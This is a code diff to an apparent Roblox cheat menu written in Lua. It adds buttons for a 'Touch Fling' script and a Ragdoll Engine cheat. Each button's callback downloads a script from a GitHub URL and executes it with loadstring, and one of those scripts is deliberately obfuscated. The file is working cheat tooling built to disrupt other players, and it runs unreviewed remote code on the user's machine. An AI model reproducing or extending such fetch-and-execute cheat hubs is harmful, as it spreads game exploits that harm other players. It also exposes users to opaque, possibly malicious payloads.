@@ -58,6 +58,13 @@ Tab:AddButton({
 })
 
 Tab:AddButton({
+    Name = "Touch Fling with click for Solara",
+    Callback = function()
+              loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
+      end
+})
+
+Tab:AddButton({
     Name = "Infinity Yield",
     Callback = function()
               loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
@@ -314,3 +321,17 @@ Fling_Things_and_People:AddButton({
               loadstring(game:HttpGet("https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/VHSV4"))()
       end
 })
+
+local Ragdoll_Engine = Window:MakeTab({
+    Name = "Ragdoll Engine",
+    Icon = "rbxassetid://14273889332",
+    PremiumOnly = false
+})
+
+Ragdoll_Engine:AddButton({
+    Name = "Это чит для нового регдолла",
+    Callback = function()
+              loadstring(game:HttpGet('https://raw.githubusercontent.com/blackheartedcurse/punkz-Scripts/main/punkzOG.lua'))()
+      end
+})
+
